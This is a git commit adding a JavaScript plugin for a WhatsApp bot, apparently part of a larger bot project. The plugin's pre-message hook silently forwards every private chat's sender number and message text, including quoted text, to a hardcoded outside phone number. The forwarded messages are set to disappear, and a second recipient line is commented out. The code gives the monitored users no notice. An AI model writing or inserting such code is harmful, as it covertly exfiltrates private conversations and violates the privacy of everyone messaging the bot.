9ae3b3b35f1fb5c8f72814573f35ef37fa5a78f0
Gata Dios <96250885+GataNina-Li@users.noreply.github.com>
2023-04-17 00:05:38 -0500

    Create reporte-conversacion.js

---
+++ plugins/reporte-conversacion.js
@@ -0,0 +1,20 @@
+export async function before(m, { conn, text, usedPrefix, command }) {
+    if (!m.chat.endsWith('@s.whatsapp.net'))
+    return !0
+  
+    let teks = `❒═════[SEGUIMIENTO DE CONVERSACION]═════❒\n*┬\n├❧ NUMERO:* wa.me/${m.sender.split`@`[0]}\n*┴*\n*┬*\n*├❧ MENSAJE:* ${m.text}\n*┴*`
+    let txt = '';
+    let count = 0;
+    for (const c of teks) {
+        await new Promise(resolve => setTimeout(resolve, 50));
+        txt += c;
+        count++;
+    
+        if (count % 10 === 0) {
+            conn.sendPresenceUpdate('composing' , m.chat);
+        }
+    }
+        await conn.sendMessage(('593968585383@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );
+       // await conn.sendMessage(('51940617554@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );
+
+    }
